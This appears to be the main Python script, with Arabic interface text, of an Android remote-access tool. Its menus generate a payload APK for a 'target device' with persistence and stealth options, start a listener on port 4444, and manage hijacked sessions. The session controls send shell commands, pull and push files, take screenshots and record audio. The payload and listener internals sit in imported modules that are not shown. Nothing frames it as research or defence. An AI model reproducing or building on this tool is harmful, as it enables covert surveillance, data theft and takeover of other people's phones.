#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة متقدمة لإنشاء بايلودات الأندرويد والاستماع عليها
Android Payload Generator & Listener Tool
"""

import os
import sys
import json
import time
import socket
import threading
import base64
import hashlib
import random
import string
from datetime import datetime
from pathlib import Path

# إضافة المسارات المطلوبة
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.payload_generator import PayloadGenerator
from core.listener import Listener
from core.session_manager import SessionManager
from core.encryption import EncryptionManager
from gui.main_window import MainWindow
from utils.helpers import get_local_ip, generate_random_string
from utils.logger import Logger

class AndroidPayloadTool:
    """الكلاس الرئيسي للأداة"""
    
    def __init__(self):
        self.logger = Logger()
        self.payload_generator = PayloadGenerator()
        self.listener = Listener()
        self.session_manager = SessionManager()
        self.encryption_manager = EncryptionManager()
        self.running = False
        
    def start_gui(self):
        """بدء الواجهة الرسومية"""
        try:
            app = MainWindow(self)
            app.run()
        except Exception as e:
            self.logger.error(f"خطأ في بدء الواجهة الرسومية: {e}")
            self.start_cli()
    
    def start_cli(self):
        """بدء الواجهة النصية"""
        self.logger.info("بدء الواجهة النصية...")
        self.show_main_menu()
    
    def show_main_menu(self):
        """عرض القائمة الرئيسية"""
        while True:
            print("\n" + "="*60)
            print("🔧 أداة إنشاء بايلودات الأندرويد المتقدمة")
            print("="*60)
            print("1. إنشاء بايلود جديد")
            print("2. بدء الاستماع")
            print("3. إدارة الجلسات")
            print("4. إعدادات التشفير")
            print("5. عرض الإحصائيات")
            print("6. خروج")
            print("="*60)
            
            choice = input("اختر رقم الخيار: ").strip()
            
            if choice == "1":
                self.create_payload_menu()
            elif choice == "2":
                self.start_listener_menu()
            elif choice == "3":
                self.session_management_menu()
            elif choice == "4":
                self.encryption_settings_menu()
            elif choice == "5":
                self.show_statistics()
            elif choice == "6":
                self.logger.info("إغلاق الأداة...")
                break
            else:
                print("❌ خيار غير صحيح!")
    
    def create_payload_menu(self):
        """قائمة إنشاء البايلود"""
        print("\n" + "="*50)
        print("📱 إنشاء بايلود الأندرويد")
        print("="*50)
        
        # إدخال المعلومات الأساسية
        payload_name = input("اسم البايلود: ").strip() or "android_payload"
        lhost = input(f"عنوان IP للاستماع (افتراضي: {get_local_ip()}): ").strip() or get_local_ip()
        lport = input("منفذ الاستماع (افتراضي: 4444): ").strip() or "4444"
        
        # خيارات متقدمة
        print("\nخيارات متقدمة:")
        use_encryption = input("استخدام التشفير؟ (y/n): ").lower() == 'y'
        use_persistence = input("إضافة الثبات؟ (y/n): ").lower() == 'y'
        use_stealth = input("وضع التخفي؟ (y/n): ").lower() == 'y'
        
        try:
            payload_path = self.payload_generator.create_payload(
                name=payload_name,
                lhost=lhost,
                lport=int(lport),
                encryption=use_encryption,
                persistence=use_persistence,
                stealth=use_stealth
            )
            
            print(f"\n✅ تم إنشاء البايلود بنجاح!")
            print(f"📁 المسار: {payload_path}")
            print(f"📱 يمكنك تثبيت الملف على الجهاز المستهدف")
            
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء البايلود: {e}")
            print(f"❌ خطأ في إنشاء البايلود: {e}")
    
    def start_listener_menu(self):
        """قائمة بدء الاستماع"""
        print("\n" + "="*50)
        print("👂 بدء الاستماع")
        print("="*50)
        
        lhost = input(f"عنوان IP للاستماع (افتراضي: {get_local_ip()}): ").strip() or get_local_ip()
        lport = input("منفذ الاستماع (افتراضي: 4444): ").strip() or "4444"
        
        try:
            print(f"\n🚀 بدء الاستماع على {lhost}:{lport}")
            print("اضغط Ctrl+C للإيقاف")
            
            self.listener.start(lhost, int(lport), self.session_manager)
            
        except KeyboardInterrupt:
            print("\n⏹️ تم إيقاف الاستماع")
        except Exception as e:
            self.logger.error(f"خطأ في الاستماع: {e}")
            print(f"❌ خطأ في الاستماع: {e}")
    
    def session_management_menu(self):
        """قائمة إدارة الجلسات"""
        print("\n" + "="*50)
        print("👥 إدارة الجلسات")
        print("="*50)
        
        sessions = self.session_manager.get_all_sessions()
        
        if not sessions:
            print("لا توجد جلسات نشطة")
            return
        
        for i, session in enumerate(sessions, 1):
            print(f"{i}. {session['id']} - {session['ip']}:{session['port']} - {session['status']}")
        
        choice = input("\nاختر رقم الجلسة (أو Enter للعودة): ").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(sessions):
            session_id = sessions[int(choice)-1]['id']
            self.session_interaction_menu(session_id)
    
    def session_interaction_menu(self, session_id):
        """قائمة التفاعل مع الجلسة"""
        while True:
            print(f"\n" + "="*50)
            print(f"🔗 الجلسة: {session_id}")
            print("="*50)
            print("1. إرسال أمر")
            print("2. عرض معلومات الجهاز")
            print("3. تحميل ملف")
            print("4. رفع ملف")
            print("5. التقاط لقطة شاشة")
            print("6. تسجيل صوت")
            print("7. العودة")
            
            choice = input("اختر رقم الخيار: ").strip()
            
            if choice == "1":
                command = input("أدخل الأمر: ").strip()
                self.session_manager.send_command(session_id, command)
            elif choice == "2":
                self.session_manager.get_device_info(session_id)
            elif choice == "3":
                file_path = input("مسار الملف للتحميل: ").strip()
                self.session_manager.download_file(session_id, file_path)
            elif choice == "4":
                file_path = input("مسار الملف للرفع: ").strip()
                self.session_manager.upload_file(session_id, file_path)
            elif choice == "5":
                self.session_manager.take_screenshot(session_id)
            elif choice == "6":
                self.session_manager.record_audio(session_id)
            elif choice == "7":
                break
            else:
                print("❌ خيار غير صحيح!")
    
    def encryption_settings_menu(self):
        """قائمة إعدادات التشفير"""
        print("\n" + "="*50)
        print("🔐 إعدادات التشفير")
        print("="*50)
        print("1. إنشاء مفاتيح جديدة")
        print("2. عرض المفاتيح الحالية")
        print("3. تصدير المفاتيح")
        print("4. استيراد المفاتيح")
        print("5. العودة")
        
        choice = input("اختر رقم الخيار: ").strip()
        
        if choice == "1":
            self.encryption_manager.generate_new_keys()
            print("✅ تم إنشاء مفاتيح جديدة")
        elif choice == "2":
            keys = self.encryption_manager.get_keys()
            print(f"🔑 المفتاح العام: {keys['public_key'][:50]}...")
            print(f"🔑 المفتاح الخاص: {keys['private_key'][:50]}...")
        elif choice == "3":
            self.encryption_manager.export_keys()
            print("✅ تم تصدير المفاتيح")
        elif choice == "4":
            self.encryption_manager.import_keys()
            print("✅ تم استيراد المفاتيح")
        elif choice == "5":
            return
        else:
            print("❌ خيار غير صحيح!")
    
    def show_statistics(self):
        """عرض الإحصائيات"""
        print("\n" + "="*50)
        print("📊 الإحصائيات")
        print("="*50)
        
        stats = self.session_manager.get_statistics()
        print(f"إجمالي الجلسات: {stats['total_sessions']}")
        print(f"الجلسات النشطة: {stats['active_sessions']}")
        print(f"إجمالي الأوامر: {stats['total_commands']}")
        print(f"إجمالي الملفات المحملة: {stats['files_downloaded']}")
        print(f"إجمالي الملفات المرفوعة: {stats['files_uploaded']}")

def main():
    """الدالة الرئيسية"""
    print("🚀 بدء تشغيل أداة بايلودات الأندرويد...")
    
    # إنشاء المجلدات المطلوبة
    os.makedirs("output", exist_ok=True)
    os.makedirs("sessions", exist_ok=True)
    os.makedirs("keys", exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    
    try:
        tool = AndroidPayloadTool()
        
        # التحقق من وجود واجهة رسومية
        if len(sys.argv) > 1 and sys.argv[1] == "--gui":
            tool.start_gui()
        else:
            tool.start_cli()
            
    except KeyboardInterrupt:
        print("\n👋 تم إغلاق الأداة")
    except Exception as e:
        print(f"❌ خطأ عام: {e}")

if __name__ == "__main__":
    main()
